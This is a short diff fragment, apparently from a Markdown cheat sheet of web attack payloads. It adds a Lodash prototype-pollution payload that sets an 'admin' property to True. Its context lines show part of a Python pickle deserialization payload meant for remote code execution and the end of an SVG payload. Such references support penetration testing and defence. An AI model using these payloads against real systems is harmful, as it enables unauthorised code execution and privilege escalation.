@@ -108,3 +108,8 @@ p = base64.b64encode(pickle.dumps(RCE())).decode()
       </svg>
     ```
 
+### Prototype pollution
+
+- **Lodash**
+  - `{"constructor": {"prototype": {"admin": True}}}`
+  
